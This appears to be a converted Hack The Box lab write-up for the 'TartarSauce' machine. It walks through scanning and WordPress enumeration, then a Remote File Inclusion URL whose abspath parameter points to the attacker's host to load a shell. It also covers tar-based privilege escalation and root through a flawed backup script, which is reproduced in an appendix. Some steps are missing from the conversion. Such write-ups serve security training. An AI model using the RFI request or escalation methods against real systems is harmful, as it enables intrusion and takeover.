# TartarSauce

*Converted from: TartarSauce.pdf*

---

# TartarSauce
## **28 [th] October 2018 / Document No D18.100.23**

**Prepared By: egre55**

**Machine Author: 3mrgnc3 & ihack4falafel**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 10


## **SYNOPSIS**

TartarSauce is a fairly challenging box that highlights the importance of a broad remote

enumeration instead of focusing on obvious but potentially less fruitful attack vectors. It features

a quite realistic privilege escalation requiring abuses of the tar command. Attention to detail

when reviewing tool output is beneficial when attempting this machine.


## **Skills Required**


  - Basic knowledge of web application

enumeration tools

  - Intermediate Linux command-line

knowledge


## **Skills Learned**


  - Static analysis of shell scripts

  - Identification and exploitation of tar

GTFOBin using multiple techniques


Page 2 / 10


## **Enumeration** **Nmap & Gobuster**

masscan -p1-65535 10.10.10.88 --rate=1000 -e tun0 > ports


ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')


Nmap -sC -sV -p$ports 10.10.10.88


exploitable in this instance.


Further enumeration using Gobuster reveals an additional “/webservices/wp” subdirectory.


go run main.go -u http://10.10.10.88/webservices/ -w

/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -s '200,204,301,302,307,403,500'


Page 3 / 10


## **WPScan**

Manual inspection confirms this is a WordPress installation and enumeration with WPScan reveals that a

vulnerable plugin “Gwolle Guestbook” is installed. However, the listed XSS vulnerability doesn’t seem that

promising.


wpscan --url http://10.10.10.88/webservices/wp --enumerate p


Even though WPScan was updated before running it, it is worth running searchsploit to check if

there there are other exploits for this plugin in Exploit-DB. There is a RFI vulnerability listed but

this doesn’t match the version reported by WPScan.


Page 4 / 10


## **Exploitation** **Remote File Inclusion**

The RFI is due to improper input sanitazation of the "abspath" parameter, which can be exploited

with an HTTP GET request as follows:


http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.

php?abspath=http://10.10.14.10


After adding the necessary firewall exceptions, the connection is received and shell upgraded.


Page 5 / 10


## **Privilege Escalation** **Tar command execution**

www-data is able to run any tar command as the user onuma, without having to enter a

password. Examination of the tar man page reveals several candidates for achieving command

execution. One well-documented method involves abusing wildcards and checkpoint actions. For

further information, see:


[https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)


Page 6 / 10


## **Exploitation of backuperer service**

After receiving a shell as onuma, the post-exploitation enumeration can be continued using

LinEnum. Carefully examination of its output reveals that a systemd timer “backuperer.service” is

run every few minutes.


watch -n 1 'systemctl list-timers'


Page 7 / 10


​



If the error “bits/libc-header-start.h: No such file” is encountered when attempting to compile the

32-bit binary, this is resolved by installing gcc-multilib.


[Reference: https://bugs.launchpad.net/ubuntu/+source/xen/+bug/1725390​](https://bugs.launchpad.net/ubuntu/+source/xen/+bug/1725390)


After transferring the payload and overwriting the temporary backup file (e.g. “.05ec79…”), the

setuid binary is successfully extracted and a root shell is gained.


Page 8 / 10



​


## **Appendix A**

#!/bin/bash


#------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by Ȝӎŗg��Ȝ

# ONUMA Dev auto backup program

# This tool will keep our webapp backed up incase another skiddie defaces us again.

# We will be able to quickly restore from a backup in seconds ;P

#------------------------------------------------------------------------------------

# Set Vars Here

basedir=/var/www/html

bkpdir=/var/backups

tmpdir=/var/tmp

testmsg=$bkpdir/onuma_backup_test.txt

errormsg=$bkpdir/onuma_backup_error.txt

tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)

check=$tmpdir/check


# formatting

printbdr()

{

for n in $(seq 72);

do /usr/bin/printf $"-";

done

}

bdr=$(printbdr)


# Added a test file to let us see when the last backup was run

/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" >


Page 9 / 10


$testmsg


# Cleanup from last time.

/bin/rm -rf $tmpdir/.* $check


# Backup onuma website dev files.

/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &


# Added delay to wait for backup to complete if large files get added.

/bin/sleep 30


# Test the backup integrity

integrity_chk()

{

/usr/bin/diff -r $basedir $check$basedir

}


/bin/mkdir $check

/bin/tar -zxvf $tmpfile -C $check

if [[ $(integrity_chk) ]]

then

# Report errors so the dev can investigate the issue.

/usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran : $(/bin/date)\n$bdr\n$tmpfile\n"

>> $errormsg

integrity_chk >> $errormsg

exit 2

else

# Clean up and save archive to the bkpdir.

/bin/mv $tmpfile $bkpdir/onuma-www-dev.bak

/bin/rm -rf $check .*

exit 0

fi


_/usr/sbin/backuperer_


Page 10 / 10


